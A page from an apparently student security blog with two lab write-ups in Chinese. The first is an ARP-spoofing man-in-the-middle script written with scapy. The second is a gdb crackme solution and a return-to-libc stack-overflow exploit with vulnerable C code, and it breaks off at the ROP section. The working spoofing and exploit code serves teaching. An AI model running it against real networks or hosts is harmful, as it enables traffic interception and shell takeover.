<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/project/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/project/images/favicon-32x32-home.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/project/images/favicon-16x16-home.png">
  <link rel="mask-icon" href="/project/images/logo.svg" color="#222">

<link rel="stylesheet" href="/project/css/main.css">


<link rel="stylesheet" href="/project/lib/font-awesome/css/all.min.css">



<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"imane219.github.io","root":"/project/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Imane&#39;s Blog">
<meta property="og:url" content="https://imane219.github.io/project/page/2/index.html">
<meta property="og:site_name" content="Imane&#39;s Blog">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="Imane">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://imane219.github.io/project/page/2/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Imane's Blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/project/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Imane's Blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/project/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/project/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/project/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/project/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

  <a href="https://github.com/Imane219" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2021/04/12/scapy%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/" class="post-title-link" itemprop="url">scapy中间人攻击</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-04-12 21:37:06" itemprop="dateCreated datePublished" datetime="2021-04-12T21:37:06+08:00">2021-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 16:04:55" itemprop="dateModified" datetime="2021-05-17T16:04:55+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="scapy实现中间人攻击（ARP欺骗）"><a href="#scapy实现中间人攻击（ARP欺骗）" class="headerlink" title="scapy实现中间人攻击（ARP欺骗）"></a>scapy实现中间人攻击（ARP欺骗）</h3><p>Scapy 是一个强大的，用 Python 编写的交互式数据包处理程序，它能让用户发送、嗅探、 解析，以及伪造网络报文，从而用来侦测、扫描和向网络发动攻击。Scapy 可以轻松地处理 扫描(scanning)、路由跟踪(tracerouting)、探测(probing)、单元测试(unit tests)、攻击(attacks)和 发现网络(network discorvery)之类的传统任务。它可以代替 hping，arpspoof，arp-sk，arping， p0f 甚至是部分的 Nmap，tcpdump 和 tshark（wireshark 的命令行工具）的功能。</p>
<p>scapy中文文档：<a target="_blank" rel="noopener" href="https://wizardforcel.gitbooks.io/scapy-docs/content/">https://wizardforcel.gitbooks.io/scapy-docs/content/</a></p>
<p>scapy中常用函数:</p>
<table>
<thead>
<tr>
<th align="left">命令</th>
<th>效果</th>
</tr>
</thead>
<tbody><tr>
<td align="left">str(pkt)</td>
<td>组装数据包</td>
</tr>
<tr>
<td align="left">hexdump(pkt)</td>
<td>十六进制转储</td>
</tr>
<tr>
<td align="left">ls(pkt)</td>
<td>显示出字段值的列表</td>
</tr>
<tr>
<td align="left">pkt.summary()</td>
<td>一行摘要</td>
</tr>
<tr>
<td align="left">pkt.show()</td>
<td>针对数据包的展开视图</td>
</tr>
<tr>
<td align="left">pkt.show2()</td>
<td>显示聚合的数据包(例如：计算好了校验和)</td>
</tr>
<tr>
<td align="left">pkt.sprintf()</td>
<td>用数据包字段填充格式字符串</td>
</tr>
<tr>
<td align="left">pkt.decode_payload_as()</td>
<td>改变payload的decode方式</td>
</tr>
<tr>
<td align="left">pkt.psdump()</td>
<td>绘制一个解释说明的PostScript图表</td>
</tr>
<tr>
<td align="left">pkt.pdfdump()</td>
<td>绘制一个解释说明的PDF</td>
</tr>
<tr>
<td align="left">pkt.command()</td>
<td>返回可以生成数据包的scapy命令</td>
</tr>
<tr>
<td align="left">summary()</td>
<td>显示一个关于每个数据包的摘要列表</td>
</tr>
<tr>
<td align="left">nsummary()</td>
<td>同上，但规定了数据包数量</td>
</tr>
<tr>
<td align="left">conversations()</td>
<td>显示一个会话图表</td>
</tr>
<tr>
<td align="left">show()</td>
<td>显示首选表示(通常用nsummary())</td>
</tr>
<tr>
<td align="left">filter()</td>
<td>返回一个$\lambda$过滤后的数据包列表</td>
</tr>
<tr>
<td align="left">hexdump()</td>
<td>返回所有数据包的一个hexdump</td>
</tr>
<tr>
<td align="left">hexraw()</td>
<td>返回所有数据包Raw layer 的hexdump</td>
</tr>
<tr>
<td align="left">padding()</td>
<td>返回一个带填充数据包的hexdump</td>
</tr>
<tr>
<td align="left">nzpadding()</td>
<td>返回一个具有非零填充的数据包的hexdump</td>
</tr>
<tr>
<td align="left">plot()</td>
<td>规划一个应用到数据包列表的$\lambda$函数</td>
</tr>
<tr>
<td align="left">make table()</td>
<td>根据$\lambda$函数来显示表格</td>
</tr>
</tbody></table>
<p><strong>要求：</strong>利用scapy实现arp中间人攻击，实现对交换网络环境下主机的监听。</p>
<ul>
<li>scapy实现arp欺骗</li>
<li>linux下路由转发开启</li>
<li>使用监听软件监听</li>
</ul>
<p><strong>步骤：</strong></p>
<p>选择kali作为实验环境，kali中本身带有scapy。</p>
<ol>
<li><p>首先使用<code>cat /proc/sys/net/ipv4/ip_forward</code>命令查看ip转发功能是否打开，如果返回的值为0说明没有打开禁止转发，为1反之。linux默认关闭ip转发功能，但是由于我们需要kali模拟网关，需要打开ip转发功能，使用命令<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>将1写入该文件中即可打开。</p>
<blockquote>
<p>注：上面的命令并没有保存对ip转发配置的更改，下次系统启动时仍会使用原来的值，要想永久修改IP转发，需要修改/etc/sysctl.conf文件，修 改下面一行的值： net.ipv4.ip_forward = 1 修改后可以重启系统来使修改生效，也可以执行下面的命令来使修改生效： sysctl -p /etc/sysctl.conf 。</p>
</blockquote>
</li>
<li><p>接着编写python脚本实现arp欺骗，选择kali虚拟机作为攻击者，win10主机作为受害者，因此先找到主机ip和默认网关，可以通过扫描的方法发现。脚本的算法是不停地向受害主机和网关发送arp包，让网关以为kali虚拟机是与他通信的主机，让win10主机以为kali虚拟机是网关，因此可以截获双方发送的数据包。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8       #避免中文乱码</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">p1 = ARP()</span><br><span class="line"><span class="comment">#被欺骗的主机ip</span></span><br><span class="line">p1.psrc = <span class="string">&quot;10.12.181.192&quot;</span></span><br><span class="line"><span class="comment">#网关ip</span></span><br><span class="line">p1.pdst = <span class="string">&quot;10.12.183.254&quot;</span></span><br><span class="line">p2 = ARP()</span><br><span class="line">p2.psrc = <span class="string">&quot;192.168.253.2&quot;</span></span><br><span class="line">p2.pdst = <span class="string">&quot;192.168.253.133&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qw</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">		time.sleep(<span class="number">0.8</span>)</span><br><span class="line">		send(p1)</span><br><span class="line"><span class="comment">#向目标发送欺骗包</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qr</span>():</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">500</span>):</span><br><span class="line">		time.sleep(<span class="number">0.8</span>)</span><br><span class="line">		send(p2)</span><br><span class="line"><span class="comment">#向网关发送欺骗包</span></span><br><span class="line">t1 = Thread(target = qw)</span><br><span class="line">t2 = Thread(target = qr)</span><br><span class="line">t1.start()</span><br><span class="line">t2.start()</span><br><span class="line"><span class="comment">### python3 arp.py  注意使用python3，因为scapy包下载在python3的目录当中</span></span><br></pre></td></tr></table></figure></li>
<li><p>用一个终端执行python脚本，另一个终端嗅探，使用scapy的sniff函数来实现嗅探。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = sniff()</span><br><span class="line">data.show()</span><br></pre></td></tr></table></figure></li>
<li><p>在主机的cmd中ping百度，可以发现有一定的延迟，因为ping包被攻击者截获转发，需要消耗一定时间，接着查看嗅探的结果，可以看到成功抓取到了DNS查询包，以及ping包。</p>
<p><img src="D:\0\blog\myblog\source_posts\计算机网络安全实验\scapy1.png" alt="scapy1"></p>
</li>
</ol>
<p><strong>遇到的问题：</strong>一开始使用driftnet想要截获访问的百度图片，但是始终没有截获到，但是不转发的话可以将主机断网，猜测是driftnet无法识别https加密过的图片。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="https://imane219.github.io/project/2021/04/12/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/project/images/avatar.gif">
      <meta itemprop="name" content="Imane">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Imane's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/project/2021/04/12/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" class="post-title-link" itemprop="url">信息系统安全</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2021-04-12 20:14:13" itemprop="dateCreated datePublished" datetime="2021-04-12T20:14:13+08:00">2021-04-12</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2021-05-17 16:03:32" itemprop="dateModified" datetime="2021-05-17T16:03:32+08:00">2021-05-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/project/categories/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息系统安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="1-gdb的初步使用"><a href="#1-gdb的初步使用" class="headerlink" title="1.gdb的初步使用"></a>1.gdb的初步使用</h3><p><strong>任务：</strong>使用gdb破解homework1程序</p>
<p><strong>步骤：</strong></p>
<ol>
<li><p>使用32位ubuntu虚拟磁盘文件创建虚拟机</p>
</li>
<li><p>运行homework1程序查看程序的输入输出，可以发现当随便输入字符串的时候会提示:(，如图，根据经验可猜测逆向破解出正确的字符串之后可以得到正确输出。</p>
<p><img src="/project/%5C%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework11.png" alt="homework11"></p>
</li>
<li><p>使用gdb调试该程序，使用<code>info functions</code>指令来列出该程序调用了哪些函数，说不定可以从函数调用中获得信息，如图，可以看到一个<code>strcmp</code>函数，很明显它是为了和正确的字符串做比对。</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework12.png" alt="homework12"></p>
</li>
<li><p>我们还是进入main函数，对其反汇编查看代码，如图，可以看到<code>strcmp</code>函数之前有一个<code>puts</code>函数和一个<code>gets</code>函数的调用，很显然<code>puts</code>函数是为了输出提示信息，也就是一开始看到的 <em>this is homework1</em>，<code>gets</code>函数是为了得到我们的输入。我们知道<code>strcmp</code>函数需要两个参数，一个是待比对字符串首地址，一个是目标字符串首地址；查看汇编代码我们可以看到<code>strcmp</code>调用之前<code>push</code>了两个值，一个是常数<strong>0x8048622</strong>，一个是<strong>eax</strong>（即ebp-0x70）。而在gets函数前我们可以看到也push了同样值的eax，很容易得出结论eax所指地址就是存放我们输入字符串的首地址，那么常数处就存放着我们的目标地址。</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework13.png" alt="homework12"></p>
</li>
<li><p>使用指令<code>x\1s 0x8048622</code>命令查看该地址处的内存信息，其中x是查看内存信息的指令，1代表长度位1，s指定输出格式为字符串，如图，得到了我们的flag：<strong>home@work@1</strong></p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework14.png" alt="homework12"></p>
</li>
<li><p>再次执行homework1程序，输入破解出来的字符串，得到输入正确提示符ok，如图所示：</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Chomework15.png" alt="homework12"></p>
</li>
</ol>
<h3 id="2-栈溢出攻击小试"><a href="#2-栈溢出攻击小试" class="headerlink" title="2.栈溢出攻击小试"></a>2.栈溢出攻击小试</h3><p><strong>任务：</strong>利用return2libc或rop攻击，编写exploit程序来构建恶意输入文件，攻击目标为运行shell</p>
<p>有缓冲区溢出漏洞的程序：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vulfunc</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">25</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buffer, str);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> str[<span class="number">500</span>];</span><br><span class="line">	FILE *badfile;</span><br><span class="line"></span><br><span class="line">	badfile = fopen(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	fread(str, <span class="keyword">sizeof</span>(<span class="keyword">char</span>), <span class="number">400</span>, badfile);</span><br><span class="line">	vulfunc(str);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Returned properly\n&quot;</span>);</span><br><span class="line">	fclose(badfile);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>平台：</strong>32位seed虚拟机</p>
<p><strong>returntolibc步骤：</strong></p>
<ol>
<li><p>首先编译有漏洞的程序，编译的时候增加选项，打开不可执行栈，关闭stackguard，关闭地址随机化。命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -fno-stack-protector -z noexecstack -o stack returntolibc_stack.c</span><br><span class="line"><span class="meta">#</span><span class="bash">或者gcc -fno-stack-protector -z noexecstack -g -o s_gdb returntolibc_stack.c 编译生成可调试的s_gdb程序</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=0</span><br></pre></td></tr></table></figure></li>
<li><p>使用gdb调试s_gdb程序，并找到system函数和exit函数的地址，命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb ./s_gdb</span><br><span class="line">run</span><br><span class="line">p system</span><br><span class="line">p exit</span><br></pre></td></tr></table></figure>

<p>结果如下图：</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc1.png"></p>
</li>
<li><p>使用断点功能找到进入后的ebp和buffer起始地址，计算出我们需要填充的参数的相对位置，使用<code>gdb ./s_gdb</code>进入可调试程序，使用<code>b vulfunc</code>设下断点，使用<code>run</code>执行程序到断点处停下，使用<code>p $ebp</code> <code>p &amp;buffer</code>来查看ebp寄存器中存的ebp的地址以及分配给buffer的首地址，两者相减得到33是栈中存ebp的地址块首地址到buffer首地址的距离。如下图所示：</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc4.png"></p>
</li>
<li><p>接着编写一个新的程序用来获取环境变量的地址，使用<code>gcc envraddr.c -o envraddr</code>编译它，使用<code>export MYSHELL=&quot;/bin/sh&quot;</code>将环境变量MYSHELL设置为”/bin/bash”字符串，使用<code>./envraddr</code>指令执行它。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//getenv用来获取MYSHELL环境变量的值（环境变量存的路径）和环境变量所在地址</span></span><br><span class="line">	<span class="keyword">char</span> *shell = (<span class="keyword">char</span> *)getenv(<span class="string">&quot;MYSHELL&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(shell)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;   Value: %s\n&quot;</span>, shell);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; Address: %x\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)shell);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot; MYSHELL not found\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果如下图，可知我们环境变量的地址是0xbfffe18，也就是我们所需要的”/bin/sh”字符串的地址.</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc2.png"></p>
</li>
<li><p>接下来需要将相关参数填充栈，从ebp依次栈底填充的内容是：system的地址、exit的地址、”/bin/sh”字符串的地址。编写python脚本实现这个功能：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Fill content with none zero values</span></span><br><span class="line">content = <span class="built_in">bytearray</span>(<span class="number">0xaa</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>))</span><br><span class="line"></span><br><span class="line">a3 = <span class="number">0xb7ec582b</span> <span class="comment"># address of &quot;/bin/sh&quot;</span></span><br><span class="line">content[<span class="number">45</span>:<span class="number">49</span>] = (a3).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">0xb7d989d0</span> <span class="comment"># address of exit()</span></span><br><span class="line">content[<span class="number">41</span>:<span class="number">45</span>] = (a2).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a1 = <span class="number">0xb7da4da0</span> <span class="comment"># address of system()</span></span><br><span class="line">content[<span class="number">37</span>:<span class="number">41</span>] = (a1).to_bytes(<span class="number">4</span>,byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;badfile&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">file.write(content)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure></li>
<li><p>最后我们执行python脚本就可以把恶意输入填充到badfile里，接着运行我们有漏洞的程序就可以实现攻击。</p>
</li>
<li><p>出现了一点问题，攻击没有反应，我们只能换个”/bin/sh”字符串地址来试试，我们尝试在gdb运行漏洞程序的时候（先在main函数处加断点，再run）加载在内存中查找字符串，使用命令<code>searchmem &quot;/bin/sh&quot;</code>，查找的结果如图所示，用新的地址替换python程序中的地址，再次尝试。</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc5.png"></p>
</li>
<li><p>终于成功了，结果如下，成功出现了新的shell输入端。</p>
<p><img src="/project/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%5Creturn2libc6.png"></p>
</li>
</ol>
<p><strong>ROP步骤：</strong></p>
<p>当我们遇到没有加载动态链接库的程序时，或者程序本身没有调用system等系统函数时，我们就无法使用returntolibc完成攻击了，这个时候可以使用rop。</p>
<ol>
<li><p>首先安装ROPgadget工具，它可以自动化生产gadget链</p>
